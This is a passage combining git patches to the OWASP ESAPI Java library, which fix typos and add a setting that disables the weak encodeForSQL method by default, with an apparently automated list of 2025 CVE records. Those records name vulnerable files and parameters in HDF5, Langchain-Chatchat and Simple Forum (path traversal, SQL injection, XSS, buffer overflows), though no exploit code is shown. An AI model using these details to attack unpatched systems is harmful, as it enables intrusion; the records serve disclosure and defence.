 src/main/java/org/owasp/esapi/codecs/DB2Codec.java    | 6 +++---
 src/main/java/org/owasp/esapi/codecs/MySQLCodec.java  | 6 +++---
 src/main/java/org/owasp/esapi/codecs/OracleCodec.java | 6 +++---
 4 files changed, 10 insertions(+), 10 deletions(-)

diff --git a/src/main/java/org/owasp/esapi/Encoder.java b/src/main/java/org/owasp/esapi/Encoder.java
index d4e7656a3..c0f33711c 100644
--- a/src/main/java/org/owasp/esapi/Encoder.java
+++ b/src/main/java/org/owasp/esapi/Encoder.java
@@ -157,7 +157,7 @@
  * to the W3C HTML specications)&em;the various {@code Codec} implemtations can offer
  * NO GUARANTEE of safety of the content being encoded or decoded. Therefore,
  * it is highly advised to practice a security-in-depth approach for everything you do.
- * By following that advise, you will minimize the impact and/or likelihood of any
+ * By following that advice, you will minimize the impact and/or likelihood of any
  * vulnerabilities from bugs in the ESAPI code or accidental misuse of the ESAPI
  * library on your part. In particular, whenever there are cases where cients use
  * any of these {@link org.owasp.esapi.codecs.Codec} classes drectly, it is highly
diff --git a/src/main/java/org/owasp/esapi/codecs/DB2Codec.java b/src/main/java/org/owasp/esapi/codecs/DB2Codec.java
index 979d35ae1..f57555571 100644
--- a/src/main/java/org/owasp/esapi/codecs/DB2Codec.java
+++ b/src/main/java/org/owasp/esapi/codecs/DB2Codec.java
@@ -16,11 +16,11 @@
 /**
  * Implementation of the Codec interface for IBM Db2 strings.
  * This function will only protect you from SQLi in limited situations.
- * To improve your changces of success, you made also need to do some
+ * To improve your chances of success, you made also need to do some
  * additional canonicalization and input validation first. Before using this class,
- * pleaes be sure to read the "SECURITY WARNING" in
+ * please be sure to read the "SECURITY WARNING" in
  * {@link org.owasp.esapi.Encoder#encodeForSQL}
- * before using this particular {@link org.owasp.esapi.codecs.Codec} and raising your hope of find
+ * before using this particular {@link org.owasp.esapi.codecs.Codec} and raising your hope of finding
  * a silver bullet to kill all the SQLi werewolves.
  *
  * @author Sivasankar Tanakala (stanakal@TRS.NYC.NY.US)
diff --git a/src/main/java/org/owasp/esapi/codecs/MySQLCodec.java b/src/main/java/org/owasp/esapi/codecs/MySQLCodec.java
index a1938ef24..9154f8df8 100644
--- a/src/main/java/org/owasp/esapi/codecs/MySQLCodec.java
+++ b/src/main/java/org/owasp/esapi/codecs/MySQLCodec.java
@@ -20,11 +20,11 @@
 /**
  * Codec implementation which can be used to escape string literals in MySQL.
  * This function will only protect you from SQLi in limited situations.
- * To improve your changces of success, you made also need to do some
+ * To improve your chances of success, you made also need to do some
  * additional canonicalization and input validation first. Before using this class,
- * pleaes be sure to read the "SECURITY WARNING" in
+ * please be sure to read the "SECURITY WARNING" in
  * {@link org.owasp.esapi.Encoder#encodeForSQL}
- * before using this particular {@link org.owasp.esapi.codecs.Codec} and raising your hope of find
+ * before using this particular {@link org.owasp.esapi.codecs.Codec} and raising your hope of finding
  * a silver bullet to kill all the SQLi werewolves.
  * </p><p>
  * This implementation accepts 2 {@code org.owasp.esapi.codes.MySQLCodec.Mode}s as identified
diff --git a/src/main/java/org/owasp/esapi/codecs/OracleCodec.java b/src/main/java/org/owasp/esapi/codecs/OracleCodec.java
index d12f6f650..4cd946286 100644
--- a/src/main/java/org/owasp/esapi/codecs/OracleCodec.java
+++ b/src/main/java/org/owasp/esapi/codecs/OracleCodec.java
@@ -20,11 +20,11 @@
 /**
  * Implementation of the {@link org.owasp.esapi.codecs.Codec} interface for Oracle DB strings. 
  * This function will only protect you from SQLi in limited situations.
- * To improve your changces of success, you made also need to do some
+ * To improve your chances of success, you made also need to do some
  * additional canonicalization and input validation first. Before using this class,
- * pleaes be sure to read the "SECURITY WARNING" in
+ * please be sure to read the "SECURITY WARNING" in
  * {@link org.owasp.esapi.Encoder#encodeForSQL}
- * before using this particular {@link org.owasp.esapi.codecs.Codec} and raising your hope of find
+ * before using this particular {@link org.owasp.esapi.codecs.Codec} and raising your hope of finding
  * a silver bullet to kill all the SQLi werewolves.
  *
  * @see <a href="http://oraqa.com/2006/03/20/how-to-escape-single-quotes-in-strings/">how-to-escape-single-quotes-in-strings</a>

From 02f4a91928003cc71cffb0b20aaa7d113bb21f8a Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Mon, 9 Jun 2025 22:07:45 -0400
Subject: [PATCH 06/14] Fix to spelling errors in the class javadoc.

---
 src/main/java/org/owasp/esapi/codecs/Codec.java | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/src/main/java/org/owasp/esapi/codecs/Codec.java b/src/main/java/org/owasp/esapi/codecs/Codec.java
index 80eb914ca..b46de6d5d 100644
--- a/src/main/java/org/owasp/esapi/codecs/Codec.java
+++ b/src/main/java/org/owasp/esapi/codecs/Codec.java
@@ -26,10 +26,10 @@
  * Other than the interfaces, very few of these concrete classes are intended to be used directly.
  * Rather, most of them are used through implementations of the {@link org.owasp.esapi.Encoder}
  * interface. While the OWASP team over the years have made every effort to be extra cautious, the
- * various {@code Codec} implemtations can offer NO GUARANTEE of safety if the client is
+ * various {@code Codec} implementations can offer NO GUARANTEE of safety if the client is
  * using these {@code Codec} classes <i>directly</i>. Therefore, if the client is using
  * these classes directly, it is highly advised to practice security-in-depth
- * and also perform canonicalization, followed by strict input valiation, both
+ * and also perform canonicalization, followed by strict input validation, both
  * prior to encoding and after decoding, to protect your application from input-based
  * attacks.
  * </p>

From 8225a67c6e1d2660fffd0735d5d6b4b309d94010 Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Tue, 10 Jun 2025 15:28:29 -0400
Subject: [PATCH 07/14] Fix 2 typos identified by @xeno6696.

---
 src/main/java/org/owasp/esapi/Encoder.java | 4 ++--
 1 file changed, 2 insertions(+), 2 deletions(-)

diff --git a/src/main/java/org/owasp/esapi/Encoder.java b/src/main/java/org/owasp/esapi/Encoder.java
index c0f33711c..0e6032d9b 100644
--- a/src/main/java/org/owasp/esapi/Encoder.java
+++ b/src/main/java/org/owasp/esapi/Encoder.java
@@ -160,7 +160,7 @@
  * By following that advice, you will minimize the impact and/or likelihood of any
  * vulnerabilities from bugs in the ESAPI code or accidental misuse of the ESAPI
  * library on your part. In particular, whenever there are cases where cients use
- * any of these {@link org.owasp.esapi.codecs.Codec} classes drectly, it is highly
+ * any of these {@link org.owasp.esapi.codecs.Codec} classes directly, it is highly
  * recommended to perform canonicalization followed by strict input valiation both
  * prior to encoding and after decoding to protect your application from input-based
  * attacks.
@@ -425,7 +425,7 @@ public interface Encoder {
      * </p><p>
      * <b>SECURITY WARNING:</b> This method is <u>NOT</u> recommended. The use of the {@code PreparedStatement}
      * interface is the preferred approach. However, if for some reason
-     * this is impossible, then this method is provided as significantly weaker
+     * this is impossible, then this method is provided as a significantly weaker
      * alternative. In particular, it should be noted that if all you do to
      * address potential SQL Injection attacks is to use this method to escape
      * parameters, you <i>will</i> fail miserably. According to the

From 61de71f70081f204b915e95d186c702509cbf857 Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Tue, 10 Jun 2025 17:52:01 -0400
Subject: [PATCH 08/14] Changed the tongue-in-cheek propert names to the actual
 ones we are using.

---
 .../esapi/errors/NotConfiguredByDefaultException.java      | 7 ++++---
 1 file changed, 4 insertions(+), 3 deletions(-)

diff --git a/src/main/java/org/owasp/esapi/errors/NotConfiguredByDefaultException.java b/src/main/java/org/owasp/esapi/errors/NotConfiguredByDefaultException.java
index fb624e75c..3c30dbfec 100644
--- a/src/main/java/org/owasp/esapi/errors/NotConfiguredByDefaultException.java
+++ b/src/main/java/org/owasp/esapi/errors/NotConfiguredByDefaultException.java
@@ -2,10 +2,11 @@
 
 /**
  * A {@code NotConfiguredByDefaultException} should be thrown when a method that
- * is disabled by default is invoked,
+ * is disabled by default is invoked.
  * </p><p>
- * See the ESAPI properties "ESAPI.enableLegCannonModeAndGetMyAssFired.methodNames" and
- * "ESAPI,enableLegCannonModeAndGetMyAssFired,justification" in the
+
+ * See the ESAPI properties "<b>ESAPI.dangerouslyAllowUnsafeMethods.methodNames</b>"
+ * and "<b>ESAPI.dangerouslyAllowUnsafeMethods.justification</b>" in the
  * <b>ESAPI.properties</b> file for additional details.
  * </p>
  */

From 06d0ff2e540ef37077822273e1957b50beaa8ff7 Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Tue, 10 Jun 2025 17:52:01 -0400
Subject: [PATCH 09/14] Changed the tongue-in-cheek property names to the
 actual ones we are using.

---
 configuration/esapi/ESAPI.properties | 27 +++++++++++++++++++++++++++
 1 file changed, 27 insertions(+)

diff --git a/configuration/esapi/ESAPI.properties b/configuration/esapi/ESAPI.properties
index b5b6aacc6..2b24814d9 100644
--- a/configuration/esapi/ESAPI.properties
+++ b/configuration/esapi/ESAPI.properties
@@ -556,3 +556,30 @@ Validator.HtmlValidationAction=throw
 # This is the default behaviour of ESAPI.
 #
 #Validator.HtmlValidationConfigurationFile=antisamy-esapi.xml
+
+########################################################################################
+# The following methods are now disabled in the default configuration and must
+# be explicity enabled. If you try to invoke a method disabled by default, ESAPI
+# will thrown a NotConfiguredByDefaultException.
+#
+# The reason for this varies, but ranges from they are not really suitable for
+# enterprise scale to that are only marginally tested (if at all) versus the are
+# unsafe for general use, although them may be fine when combined with other
+# security-in-depth techiques.
+#
+# The disabled-by-default methods are:
+#   org.owasp.esapi.reference.DefaultEncoder.encodeForSQL
+#   org.owasp.esapi.ESAPI.accessController  [FUTURE; will correspond to deprecation notice]
+#
+# Mote details to explain this may be found in the ESAPI GitHub wiki article at
+#   https://github.com/ESAPI/esapi-java-legacy/wiki/Reducing-the-ESAPI-Library's-Attack-Surface
+###########
+# The format is a comma-separated list of fully.Qualified.ClassName.methodName;
+# all class names must begin with "org.owasp.esapi.".
+ESAPI.dangerouslyAllowUnsafeMethods.methodNames=
+###########
+# Normally you would put some text here (that will be logged) that provides some
+# justification as to why you have enabled these functions. This can be
+# anythuing such as a Jira or ServiceNow ticket number, a security exception
+# reference, etc. If it is left empty, it will just like "Justification: none".`
+ESAPI.enableLegCannonModeAndGetMyAssFired.justification=

From a10e323dcde635f40d15c875253084a7669175e8 Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Tue, 10 Jun 2025 18:10:56 -0400
Subject: [PATCH 10/14] hanged the tongue-in-cheek property names to the actual
 ones we are using.

---
 src/test/resources/esapi/ESAPI.properties | 9 ++++++---
 1 file changed, 6 insertions(+), 3 deletions(-)

diff --git a/src/test/resources/esapi/ESAPI.properties b/src/test/resources/esapi/ESAPI.properties
index 1007597f5..7327fbc85 100644
--- a/src/test/resources/esapi/ESAPI.properties
+++ b/src/test/resources/esapi/ESAPI.properties
@@ -593,9 +593,10 @@ Validator.HtmlValidationAction=throw
 #   org.owasp.esapi.reference.DefaultEncoder.encodeForSQL
 #   org.owasp.esapi.ESAPI.accessController  [FUTURE]
 #
-# The format is a comma-separated list of fully,Qualified.ClassNames.methodName
+# The format is a comma-separated list of fully.Qualified.ClassName.methodName;
+# all class names must begin with "org.owasp.esapi.".
 #
-#   Note to ESAPI Devs: There is presently no way to specific which specific
+#   Note to ESAPI Devs: There is presently NO WAY to specific which specific
 #                       method to indicate here when the method name alone,
 #                       absent from its signature, is ambiguous, so it is
 #                       best to avoid those if at all possible!
@@ -605,7 +606,9 @@ Validator.HtmlValidationAction=throw
 #                       which has 4 interfaces so currently, there's no way to
 #                       specify a specific one.
 #       
-ESAPI.enableLegCannonModeAndGetMyAssFired.methodNames=org.owasp.esapi.reference.DefaultEncoder.encodeForSQL
+#       We need this there for our existing JUnit tests for encodeForSQL. Use an
+#       alternate ESAPI property config filen name for testing this aspect out.
+ESAPI.dangerouslyAllowUnsafeMethods.methodNames=org.owasp.esapi.reference.DefaultEncoder.encodeForSQL
 
 # Normally you would put some text here (that will be logged) that provides some
 # justification as to why you have enabled these functions. This can be

From 844eb0c6fd077b6299604838bfc67fd6c658e6eb Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Tue, 10 Jun 2025 18:12:01 -0400
Subject: [PATCH 11/14] Add missing newline.

---
 src/test/resources/esapi/ESAPI-test.properties | 2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)

diff --git a/src/test/resources/esapi/ESAPI-test.properties b/src/test/resources/esapi/ESAPI-test.properties
index 72dd9e50a..d46c2d34e 100644
--- a/src/test/resources/esapi/ESAPI-test.properties
+++ b/src/test/resources/esapi/ESAPI-test.properties
@@ -5,4 +5,4 @@ invalid_int_property=invalid int
 boolean_property=true
 boolean_yes_property=yes
 boolean_no_property=no
-invalid_boolean_property=invalid boolean
\ No newline at end of file
+invalid_boolean_property=invalid boolean

From eb425bbb831c68321d169d3ac5f84ddf9dfc189d Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Tue, 10 Jun 2025 18:12:45 -0400
Subject: [PATCH 12/14] New property file for testing
 DefaultEncoder.encodeForSQL when it's method is not explicitly enabled.
 Should result in a NotConfiguredByDefaultException being thrown.

---
 src/test/resources/esapi/new-props.properties | 58 +++++++++++++++++++
 1 file changed, 58 insertions(+)
 create mode 100644 src/test/resources/esapi/new-props.properties

diff --git a/src/test/resources/esapi/new-props.properties b/src/test/resources/esapi/new-props.properties
new file mode 100644
index 000000000..5dc3ab1c2
--- /dev/null
+++ b/src/test/resources/esapi/new-props.properties
@@ -0,0 +1,58 @@
+# For testing new properties part of PR# 886. Hoping these are the only
+# properties that will be needed. TBD.
+
+
+ESAPI.Encoder=org.owasp.esapi.reference.DefaultEncoder
+
+ESAPI.Logger=org.owasp.esapi.logging.java.JavaLogFactory
+#===========================================================================
+# ESAPI Logging
+# Set the application name if these logs are combined with other applications
+Logger.ApplicationName=ExampleApplication
+# If you use an HTML log viewer that does not properly HTML escape log data, you can set LogEncodingRequired to true
+Logger.LogEncodingRequired=false
+# Determines whether ESAPI should log the application name. This might be clutter in some single-server/single-app environments.
+Logger.LogApplicationName=true
+# Determines whether ESAPI should log the server IP and port. This might be clutter in some single-server environments.
+Logger.LogServerIP=true
+# Determines whether ESAPI should log the user info.
+Logger.UserInfo=true
+# Determines whether ESAPI should log the session id and client IP.
+Logger.ClientInfo=true
+
+# Determines whether ESAPI should log the prefix of [EVENT_TYPE - APPLICATION NAME].
+# If all above Logger entries are set to false, as well as LogPrefix, then the output would be the same as if no ESAPI was used
+Logger.LogPrefix=true
+
+################## NEW PROPERTIES ################### 
+#
+#   NOTE: I still like the property name
+#       ESAPI.enableLegCannonModeAndGetMyAssFired.methodNames"
+#   and
+#       ESAPI.enableLegCannonModeAndGetMyAssFired.methodNames"
+#   better. Betcha those would be set a lot less often than this "more
+#   professional" names will be.
+#
+########################################################################################
+# The following methods are now disabled in the default configuration and must
+# be explicity enabled. If you try to invoke a method disabled by default, ESAPI
+# will thrown a NotConfiguredByDefaultException.
+#
+# The reason for this varies, but ranges from they are not really suitable for
+# enterprise scale to that are only marginally tested (if at all) versus the are
+# unsafe for general use, although them may be fine when combined with other
+# security-in-depth techiques.
+#
+# The disabled-by-default methods are:
+#   org.owasp.esapi.reference.DefaultEncoder.encodeForSQL
+#   org.owasp.esapi.ESAPI.accessController  [FUTURE; will correspond to deprecation notice]
+#
+# The format is a comma-separated list of fully.Qualified.ClassName.methodName;
+# all class names must begin with "org.owasp.esapi.".
+ESAPI.dangerouslyAllowUnsafeMethods.methodNames=
+
+# Normally you would put some text here (that will be logged) that provides some
+# justification as to why you have enabled these functions. This can be
+# anythuing such as a Jira or ServiceNow ticket number, a security exception
+# reference, etc. If it is left empty, it will just like "Justification: none".`
+ESAPI.enableLegCannonModeAndGetMyAssFired.justification=

From 01297409b786075686c6738fdf0355edad427a6c Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Tue, 10 Jun 2025 18:16:43 -0400
Subject: [PATCH 13/14] Added 2 new field names whose values are the 2 new
 property names.

---
 src/main/java/org/owasp/esapi/PropNames.java | 4 +++-
 1 file changed, 3 insertions(+), 1 deletion(-)

diff --git a/src/main/java/org/owasp/esapi/PropNames.java b/src/main/java/org/owasp/esapi/PropNames.java
index ab30e47fa..8aa4179a9 100644
--- a/src/main/java/org/owasp/esapi/PropNames.java
+++ b/src/main/java/org/owasp/esapi/PropNames.java
@@ -87,6 +87,8 @@ public final class PropNames {
     public static final String ADDITIONAL_ALLOWED_CIPHER_MODES                                                  = "Encryptor.cipher_modes.additional_allowed";
     public static final String KDF_PRF_ALG                                                                      = "Encryptor.KDF.PRF";
     public static final String PRINT_PROPERTIES_WHEN_LOADED                                                     = "ESAPI.printProperties";
+    public static final String ACCEPTED_UNSAFE_METHOD_NAMES                                                     = "ESAPI.dangerouslyAllowUnsafeMethods.methodNames";
+    public static final String ACCEPTED_UNSAFE_METHODS_JUSTIFICATION                                            = "ESAPI.dangerouslyAllowUnsafeMethods.justification";
 
     public static final String WORKING_DIRECTORY                                                                = "Executor.WorkingDirectory";
     public static final String APPROVED_EXECUTABLES                                                             = "Executor.ApprovedExecutables";
@@ -129,7 +131,7 @@ public final class PropNames {
     public static final String DISCARD_LOGSPECIAL                                                               = "org.owasp.esapi.logSpecial.discard";
 
     /*
-     * Implementation Keys
+     * Implementation Keys for the various major ESAPI components.
      */
     public static final String LOG_IMPLEMENTATION                                                               = "ESAPI.Logger";
     public static final String AUTHENTICATION_IMPLEMENTATION                                                    = "ESAPI.Authenticator";

From 23a2b7666186afdc004a9e01eec5da593e85d172 Mon Sep 17 00:00:00 2001
From: kwwall <kevin.w.wall@gmail.com>
Date: Tue, 10 Jun 2025 18:19:10 -0400
Subject: [PATCH 14/14] Added Javadoc to encodeForSQL method regarding how to
 enabled it.

---
 src/main/java/org/owasp/esapi/Encoder.java | 10 ++++++++++
 1 file changed, 10 insertions(+)

diff --git a/src/main/java/org/owasp/esapi/Encoder.java b/src/main/java/org/owasp/esapi/Encoder.java
index 0e6032d9b..b16624add 100644
--- a/src/main/java/org/owasp/esapi/Encoder.java
+++ b/src/main/java/org/owasp/esapi/Encoder.java
@@ -470,9 +470,19 @@ public interface Encoder {
      * OWASP SQL Injection Prevention Cheat Sheet</a>. If you allow this, we recommend only
      * doing so for a limited time duration and in the meantime creating some sort of security
      * exception ticket to track it.
+     * </p><p>
+     * <b>IMPORTANT NOTE:</b> If you really do insist enabling leg cannon mode and use
+     * this method, then you <i>MUST<i> follow these instructions. Failure to do so will
+     * result in a {@link org.owasp.esapi.errors.NotConfiguredByDefaultException} being
+     * thrown when you try to call it. Thus to make it work, you need to add the implementation
+     * method corresponding to this interace (defined in the property "<b>ESAPI.Encoder</b>"
+     * (wihch defaults to "org.owasp.esapi.reference.DefaultEncoder") in your "<b>ESAPI.properties</b>" file,
+     * to the ESAPI property "<b>ESAPI.dangerouslyAllowUnsafeMethods.methodNames</b>". See
+     * the Security Bulletin #13 document referenced below for additional details.
      * </p>
      * @see <a href="https://download.oracle.com/otn-pub/jcp/jdbc-4_2-mrel2-spec/jdbc4.2-fr-spec.pdf">JDBC Specification</a>
      * @see <a href="https://docs.oracle.com/javase/8/docs/api/java/sql/PreparedStatement.html">java.sql.PreparedStatement</a>
+     * @see <a href="https://github.com/ESAPI/esapi-java-legacy/blob/develop/documentation/ESAPI-security-bulletin13.pdf">ESAPI Security Bulletin #13</a>
      *
      * @param codec
      *      a {@link org.owasp.esapi.codecs.Codec} that declares which database 'input' is being encoded for (ie. MySQL, Oracle, etc.)


================================================================================


CVE ID: CVE-2025-6858
Published: 2025-06-29T11:15:24.313
Modified: 2025-07-08T14:38:35.413
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-404: CWE-404
  - CWE-476: NULL Pointer Dereference

Description:
A vulnerability was found in HDF5 1.14.6 and classified as problematic. Affected by this issue is the function H5C__flush_single_entry of the file src/H5Centry.c. The manipulation leads to null pointer dereference. The attack needs to be approached locally. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/HDFGroup/hdf5/issues/5576 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://github.com/user-attachments/files/20623475/hdf5_crash_8.txt [Exploit]
  3. https://vuldb.com/?ctiid.314330 [Permissions Required]
  4. https://vuldb.com/?id.314330 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602530 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5576 ---
H5C__flush_single_entry

src/H5Centry.c:688:9

H5C__flush_single_entry

================================================================================


CVE ID: CVE-2025-6857
Published: 2025-06-29T10:15:22.800
Modified: 2025-07-08T14:39:20.493
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-121: CWE-121

Description:
A vulnerability has been found in HDF5 1.14.6 and classified as problematic. Affected by this vulnerability is the function H5G__node_cmp3 of the file src/H5Gnode.c. The manipulation leads to stack-based buffer overflow. It is possible to launch the attack on the local host. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/HDFGroup/hdf5/issues/5575 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://github.com/user-attachments/files/20623442/hdf5_crash_7.txt [Exploit]
  3. https://vuldb.com/?ctiid.314329 [Permissions Required]
  4. https://vuldb.com/?id.314329 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602529 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5575 ---
H5G__node_cmp3

src/H5Gnode.c:415:9

H5G__node_cmp3

================================================================================


CVE ID: CVE-2025-6856
Published: 2025-06-29T10:15:21.443
Modified: 2025-07-08T14:39:33.110
CVSS Score: 3.3 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L

CWE Categories:
  - CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  - CWE-416: Use After Free

Description:
A vulnerability, which was classified as problematic, was found in HDF5 1.14.6. Affected is the function H5FL__reg_gc_list of the file src/H5FL.c. The manipulation leads to use after free. Attacking locally is a requirement. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/HDFGroup/hdf5/issues/5574 [Exploit, Issue Tracking, Third Party Advisory]
  2. https://github.com/user-attachments/files/20623417/hdf5_crash_6.txt [Exploit]
  3. https://vuldb.com/?ctiid.314328 [Permissions Required]
  4. https://vuldb.com/?id.314328 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.602528 [Third Party Advisory, VDB Entry]

Attempting to extract code examples from references...

--- Code from https://github.com/HDFGroup/hdf5/issues/5574 ---
H5FL__reg_gc_list

src/H5FL.c:428:26

H5FL__reg_gc_list

================================================================================


CVE ID: CVE-2025-6855
Published: 2025-06-29T09:15:24.290
Modified: 2025-06-30T18:38:23.493
CVSS Score: 5.5 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:A/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability, which was classified as critical, has been found in chatchat-space Langchain-Chatchat up to 0.3.1. This issue affects some unknown processing of the file /v1/file. The manipulation of the argument flag leads to path traversal. The exploit has been disclosed to the public and may be used.

References (4):
  1. https://github.com/chatchat-space/Langchain-Chatchat/issues/5354
  2. https://vuldb.com/?ctiid.314327
  3. https://vuldb.com/?id.314327
  4. https://vuldb.com/?submit.601162

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314327 ---
flag

================================================================================


CVE ID: CVE-2025-6853
Published: 2025-06-29T08:15:21.550
Modified: 2025-09-16T13:34:02.377
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

Description:
A vulnerability classified as critical has been found in chatchat-space Langchain-Chatchat up to 0.3.1. This affects the function upload_temp_docs of the file /knowledge_base/upload_temp_docs of the component Backend. The manipulation of the argument flag leads to path traversal. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used.

References (5):
  1. https://github.com/chatchat-space/Langchain-Chatchat/issues/5352 [Exploit, Issue Tracking]
  2. https://vuldb.com/?ctiid.314325 [Permissions Required, VDB Entry]
  3. https://vuldb.com/?id.314325 [Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?submit.601155 [Third Party Advisory, VDB Entry]
  5. https://github.com/chatchat-space/Langchain-Chatchat/issues/5352 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314325 ---
upload_temp_docs

upload_temp_docs

flag

================================================================================


CVE ID: CVE-2025-6850
Published: 2025-06-29T07:15:25.450
Modified: 2025-07-08T14:40:08.473
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability has been found in code-projects Simple Forum 1.0 and classified as critical. Affected by this vulnerability is an unknown functionality of the file /forum1.php. The manipulation of the argument File leads to sql injection. The attack can be launched remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/20 [Exploit, Issue Tracking]
  3. https://vuldb.com/?ctiid.314293 [Permissions Required, Third Party Advisory, VDB Entry]
  4. https://vuldb.com/?id.314293 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603352 [Third Party Advisory, VDB Entry]
  6. https://github.com/ez-lbz/poc/issues/20 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314293 ---
file

================================================================================


CVE ID: CVE-2025-6849
Published: 2025-06-29T07:15:24.343
Modified: 2025-07-01T18:25:17.570
CVSS Score: 3.5 (LOW) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:L/A:N

CWE Categories:
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
  - CWE-94: Improper Control of Generation of Code ('Code Injection')
  - CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

Description:
A vulnerability, which was classified as problematic, was found in code-projects Simple Forum 1.0. Affected is an unknown function of the file /forum_edit1.php. The manipulation of the argument text leads to cross site scripting. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/19 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314292 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314292 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603351 [Third Party Advisory, VDB Entry]
  6. https://github.com/ez-lbz/poc/issues/19 [Exploit, Issue Tracking, Third Party Advisory]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314292 ---
text

================================================================================


CVE ID: CVE-2025-6848
Published: 2025-06-29T06:15:23.457
Modified: 2025-07-01T13:44:44.923
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-284: CWE-284
  - CWE-434: Unrestricted Upload of File with Dangerous Type
  - CWE-434: Unrestricted Upload of File with Dangerous Type

Description:
A vulnerability, which was classified as critical, has been found in code-projects Simple Forum 1.0. This issue affects some unknown processing of the file /forum1.php. The manipulation of the argument File leads to unrestricted upload. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/18 [Exploit, Issue Tracking]
  3. https://vuldb.com/?ctiid.314291 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314291 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603349 [Third Party Advisory, VDB Entry]
  6. https://github.com/ez-lbz/poc/issues/18 [Exploit, Issue Tracking]

Attempting to extract code examples from references...

--- Code from https://vuldb.com/?id.314291 ---
file

================================================================================


CVE ID: CVE-2025-6847
Published: 2025-06-29T06:15:21.230
Modified: 2025-07-01T00:46:11.677
CVSS Score: 6.3 (MEDIUM) [v3.1]
CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L

CWE Categories:
  - CWE-74: CWE-74
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')
  - CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

Description:
A vulnerability classified as critical was found in code-projects Simple Forum 1.0. This vulnerability affects unknown code of the file /forum_edit.php. The manipulation of the argument iii leads to sql injection. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

References (6):
  1. https://code-projects.org/ [Product]
  2. https://github.com/ez-lbz/poc/issues/17 [Exploit, Issue Tracking, Third Party Advisory]
  3. https://vuldb.com/?ctiid.314290 [Permissions Required, VDB Entry]
  4. https://vuldb.com/?id.314290 [Third Party Advisory, VDB Entry]
  5. https://vuldb.com/?submit.603347 [Third Party Advisory, VDB Entry]
  6. https://github.com/ez-lbz/poc/issues/17 [Exploit, Issue Tracking, Third Party Advisory]

